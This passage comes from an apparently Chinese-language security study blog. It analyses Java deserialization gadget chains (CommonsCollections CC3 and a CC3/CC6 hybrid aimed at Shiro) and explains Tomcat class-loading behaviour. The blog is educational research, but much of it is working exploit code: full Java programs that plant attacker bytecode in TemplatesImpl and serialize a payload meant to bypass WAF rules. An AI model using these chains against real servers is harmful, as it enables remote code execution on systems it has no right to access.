com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Study\\java sec\\04\\target\\classes\\outCalc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"><span class="comment">//        new TrAXFilter(templates);</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        transformer.transform(TrAXFilter.class);</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map,transformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,TrAXFilter.class); <span class="comment">// 先存成map之后改成lazyMap，防止put的时候调用hashCode</span></span><br><span class="line"><span class="comment">//        tiedMapEntry.hashCode();</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(tiedMapEntry,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> TiedMapEntry.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">map2</span> <span class="operator">=</span> c3.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        map2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map2.set(tiedMapEntry,lazyMap);</span><br><span class="line"></span><br><span class="line">        serialize(map1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这个是我根据之前的知识，结合源码，一点一点手搓的。。。太不易了。。。</p><h3 id="为什么不能带有数组类"><a href="#为什么不能带有数组类" class="headerlink" title="为什么不能带有数组类"></a>为什么不能带有数组类</h3><p>因为shiro反序列的时候会调用自己包装的ObjectInputStream类，即ClassResolvingObjectInputStream<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201956081.png" alt="img"></p><p>java反序列化的时候会调用ObjectInputStream#resolveClass方法来读取反序列化的类名  。而ClassResolvingObjectInputStream重写了resolveClass方法。调用ClassUtils.forName来获取类名。而ClassUtils#forName，</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201956944.png" alt="img"></p><p>在tomcat环境下就会调用tomcat自己的类加载器。而tomcat的类加载机制打破了双亲委派机制。参考：<a href="https://blog.csdn.net/a745233700/article/details/120802616%E3%80%82%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4Tomcat">https://blog.csdn.net/a745233700/article/details/120802616。也就是说Tomcat</a> 的 WebAppClassLoader 并没有先使用 AppClassLoader 来加载类，而是直接使用了 ExtClassLoader 来加载类。不过 ExtClassLoader 依然遵循双亲委派，它会使用 Bootstrap ClassLoader 来对类进行加载。</p><p> WebappClassLoader#loadClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//1. 先在本地cache查找该类是否已经加载过</span></span><br><span class="line">        clazz = findLoadedClass0(name);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (resolve)</span><br><span class="line">                resolveClass(clazz);</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2. 从系统类加载器的cache中查找是否加载过</span></span><br><span class="line">        clazz = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (resolve)</span><br><span class="line">                resolveClass(clazz);</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3. 尝试用ExtClassLoader类加载器类加载(ExtClassLoader 遵守双亲委派，ExtClassLoader 会使用 Bootstrap ClassLoader 对类进行加载)</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">javaseLoader</span> <span class="operator">=</span> getJavaseClassLoader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = javaseLoader.loadClass(name);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (resolve)</span><br><span class="line">                    resolveClass(clazz);</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// Ignore</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 4. 尝试在本地目录搜索class并加载</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = findClass(name);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (resolve)</span><br><span class="line">                    resolveClass(clazz);</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// Ignore</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 5. 尝试用系统类加载器(AppClassLoader)来加载</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = Class.forName(name, <span class="literal">false</span>, parent);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (resolve)</span><br><span class="line">                    resolveClass(clazz);</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// Ignore</span></span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">//6. 上述过程都加载失败，抛出异常</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​ 关注32行。WebAppClassLoader#findClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Ask our superclass to locate this class, if possible</span></span><br><span class="line">    <span class="comment">// (throws ClassNotFoundException if it is not found)</span></span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 先在自己的 Web 应用目录下查找 class</span></span><br><span class="line">    clazz = findClassInternal(name);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 找不到 在交由父类来处理</span></span><br><span class="line">    <span class="keyword">if</span> ((clazz == <span class="literal">null</span>) &amp;&amp; hasExternalRepositories) &#123;  </span><br><span class="line">        clazz = <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​其查找类的方式和URLClassLoader#findClass一样，都是直接类名+.class，为类的路径。（未调试代码可能存在误区）</p><p>这就会导致无法加载到数组类。</p>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化CommonsCollections利用链篇三</title>
      <link href="/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E5%88%A9%E7%94%A8%E9%93%BE%E7%AF%87%E4%B8%89/"/>
      <url>/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E5%88%A9%E7%94%A8%E9%93%BE%E7%AF%87%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>CC3换了一种命令执行的方式，其中需要用到TemplatesImpl类，实际上使用它导致的是代码执行，在学习之前学习一下这个类。回顾一下利用代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonsCollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">        <span class="comment">// 设置_name不为空</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Study\\java sec\\04\\target\\classes\\outCalc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        <span class="comment">// 定义字节码，反射修改_bytecodes的值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line">        <span class="comment">// _tfactory赋值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">// 调用测试</span></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TemplatesImpl实现了Serializable接口因此可直接序列化。所以可以直接构造出利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonsCollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">        <span class="comment">// 设置_name不为空</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="comment">// 定义字节码，反射修改_bytecodes的值</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Study\\java sec\\04\\target\\classes\\outCalc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line">        <span class="comment">// _tfactory赋值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        调用测试</span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line"></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,map);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        serialize(constructor.newInstance(Override.class,mapProxy));</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ysoserial中的CC3"><a href="#ysoserial中的CC3" class="headerlink" title="ysoserial中的CC3"></a>ysoserial中的CC3</h2><p>上面我们通过TemplatesImpl类实现了代码执行，实际上使用它避免waf对Runtime类的限制，CC3的初衷是为了绕过规则，查看ysoserial的CC3会发现它没有使用InvokerTransformer而是使用了InstantiateTransformer。InstantiateTransformer类的transform是获取Class的构造器，并进行初始化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上面的分析我们只要调用了templates.newTransformer()方法就能够执行代码，看一下哪个地方调用了这个方法。查找发现TrAXFilter类的构造函数中调用了newTransformer方法而且参数可直接控制：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = 